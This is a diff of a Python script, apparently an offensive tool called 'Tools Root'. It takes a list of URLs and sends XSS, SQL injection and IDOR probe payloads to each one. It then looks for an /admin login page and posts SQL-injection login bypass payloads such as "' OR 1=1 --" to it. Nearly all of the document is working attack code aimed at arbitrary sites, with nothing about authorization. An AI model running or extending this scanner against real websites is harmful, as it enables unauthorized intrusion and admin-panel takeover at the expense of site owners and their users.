@@ -1,29 +1,30 @@
 import requests
-from bs4 import BeautifulSoup
 import os
-import time
+import pandas as pd
 from colorama import Fore, init
 from tqdm import tqdm
-import pandas as pd
 import pyfiglet
-from concurrent.futures import ThreadPoolExecutor
 
 init(autoreset=True)
 
-# Vulnerability payloads
+# Payloads for vulnerabilities
 xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
 sql_payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
-idor_user_ids = [1, 2, 3, 9999]
-ssrf_payload = "http://example.com"
+idor_user_ids = [1, 2, 3, 999]
+bypass_payloads = [
+    {"username": "' OR 1=1 --", "password": "any"},
+    {"username": "admin", "password": "' OR '1'='1"},
+    {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
+]
 
-# Functions for vulnerability scanning
+# Vulnerability scan functions
 def scan_xss(url):
     results = []
     for payload in xss_payloads:
         try:
             response = requests.get(f"{url}?q={payload}", timeout=10)
             if payload in response.text:
-                results.append({"payload": payload, "path": f"{url}?q={payload}"})
+                results.append({"Path": f"{url}?q={payload}", "Payload": payload})
         except requests.exceptions.RequestException:
             continue
     return results
@@ -34,7 +35,7 @@ def scan_sql_injection(url):
         try:
             response = requests.get(f"{url}?id={payload}", timeout=10)
             if "syntax" in response.text.lower() or "mysql" in response.text.lower():
-                results.append({"payload": payload, "path": f"{url}?id={payload}"})
+                results.append({"Path": f"{url}?id={payload}", "Payload": payload})
         except requests.exceptions.RequestException:
             continue
     return results
@@ -46,103 +47,60 @@ def scan_idor(url):
         try:
             response = requests.get(path, timeout=10)
             if response.status_code == 200 and "user" in response.text.lower():
-                results.append({"payload": f"User ID: {user_id}", "path": path})
+                results.append({"Path": path, "Payload": f"User ID: {user_id}"})
         except requests.exceptions.RequestException:
             continue
     return results
 
-def scan_ssrf(url):
-    try:
-        response = requests.get(f"{url}?url={ssrf_payload}", timeout=10)
-        if "example" in response.text.lower():
-            return {"payload": ssrf_payload, "path": f"{url}?url={ssrf_payload}"}
-    except requests.exceptions.RequestException:
-        return None
-
-# Admin panel discovery and bypass
-def discover_admin_page(site):
-    admin_paths = [
-        "admin", "admin.php", "admin/login.php", "login", "administrator", "adminpanel",
-        "admin_login", "cpanel", "dashboard", "admin_area", "admin_console"
-    ]
-    for path in admin_paths:
-        admin_url = f"{site}/{path}"
-        try:
-            response = requests.get(admin_url, timeout=10)
-            if response.status_code == 200 and "login" in response.text.lower():
-                return admin_url
-        except requests.exceptions.RequestException:
-            continue
-    return None
-
-def bypass_admin(admin_url):
-    payloads = [
-        {"username": "' OR 1=1 --", "password": "any"},
-        {"username": "admin", "password": "' OR '1'='1"},
-        {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
-    ]
-    for payload in payloads:
+def bypass_admin_panel(admin_url):
+    results = []
+    for payload in bypass_payloads:
         try:
             response = requests.post(admin_url, data=payload, timeout=10)
-            if "dashboard" in response.text.lower() or response.status_code == 200:
-                return {"path": admin_url, "username": payload["username"], "password": payload["password"]}
+            if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
+                results.append({"Path": admin_url, "Payload": payload})
+                break
         except requests.exceptions.RequestException:
             continue
-    return None
-
-# Crawling and scanning
-def crawl_site(url):
-    try:
-        response = requests.get(url, timeout=10)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        links = [url]
-        for link in soup.find_all('a', href=True):
-            if link['href'].startswith('http'):
-                links.append(link['href'])
-            elif link['href'].startswith('/'):
-                links.append(url + link['href'])
-        return set(links)
-    except requests.exceptions.RequestException:
-        return []
-
-# Main scanning function
-def scan_site(url):
-    print(Fore.YELLOW + f"Scanning site: {url}")
-    links = crawl_site(url)
-    results = []
-
-    for link in links:
-        print(Fore.CYAN + f"Scanning link: {link}")
-        results.extend(scan_xss(link))
-        results.extend(scan_sql_injection(link))
-        results.extend(scan_idor(link))
-        ssrf_result = scan_ssrf(link)
-        if ssrf_result:
-            results.append(ssrf_result)
-    
-    admin_url = discover_admin_page(url)
-    if admin_url:
-        bypass_result = bypass_admin(admin_url)
-        if bypass_result:
-            results.append({
-                "path": bypass_result["path"], 
-                "payload": f"Username: {bypass_result['username']} Password: {bypass_result['password']}", 
-                "vulnerability": "Admin Bypass"
-            })
-
     return results
 
-# Display results
-def display_results(results):
-    if results:
-        df = pd.DataFrame(results)
-        print(Fore.GREEN + df.to_string(index=False))
-    else:
-        print(Fore.RED + "No vulnerabilities detected.")
+# Discover admin panel and scan bypass
+def discover_and_bypass_admin(url):
+    admin_url = f"{url}/admin"
+    try:
+        response = requests.get(admin_url, timeout=10)
+        if response.status_code == 200 and "login" in response.text.lower():
+            return bypass_admin_panel(admin_url)
+    except requests.exceptions.RequestException:
+        pass
+    return []
 
-# Program entry point
+# Main scan function
+def scan_site(url):
+    xss_results = scan_xss(url)
+    sql_results = scan_sql_injection(url)
+    idor_results = scan_idor(url)
+    bypass_results = discover_and_bypass_admin(url)
+    return {
+        "XSS": xss_results,
+        "SQL Injection": sql_results,
+        "IDOR": idor_results,
+        "Admin Bypass": bypass_results
+    }
+
+# Display results in separate tables
+def display_results(all_results):
+    for vuln_type, results in all_results.items():
+        if results:
+            print(Fore.GREEN + f"\nResults for {vuln_type}:")
+            df = pd.DataFrame(results)
+            print(Fore.GREEN + df.to_string(index=False))
+        else:
+            print(Fore.RED + f"\nNo {vuln_type} vulnerabilities detected.")
+
+# Entry point
 def main():
-    print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("Tools Root", font="slant"))
+    print(Fore.CYAN + pyfiglet.figlet_format("Tools Root", font="slant"))
     filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")
 
     if not os.path.exists(filename):
@@ -152,13 +110,14 @@ def main():
     with open(filename, 'r') as file:
         urls = [line.strip() for line in file.readlines()]
 
-    all_results = []
-    with ThreadPoolExecutor(max_workers=5) as executor:
-        futures = {executor.submit(scan_site, url): url for url in urls}
-        for future in tqdm(futures, desc="Scanning Sites"):
-            all_results.extend(future.result())
+    all_vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}
+    for url in tqdm(urls, desc="Scanning Sites", ncols=100):
+        site_results = scan_site(url)
+        for vuln_type, results in site_results.items():
+            all_vulnerabilities[vuln_type].extend(results)
 
-    display_results(all_results)
+    print(Fore.CYAN + "\nScan completed. Results:")
+    display_results(all_vulnerabilities)
 
 if __name__ == "__main__":
     main()
